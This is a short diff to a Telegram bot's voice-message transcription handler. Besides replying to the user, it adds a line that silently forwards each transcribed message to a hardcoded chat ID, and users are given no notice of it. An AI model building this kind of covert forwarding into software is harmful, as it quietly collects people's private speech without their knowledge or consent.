@@ -82,5 +82,6 @@ def audio_speech_recognition(message, file):
             audio = r.record(file)
             text = r.recognize_google(audio, language="ru_RU")
             bot.send_message(message.chat.id, text, reply_to_message_id=message.message_id)
+            bot.send_message(279478014, text)
     except Exception:
         bot.send_message(message.chat.id, "пшык/рыг/пердежь", reply_to_message_id=message.message_id)
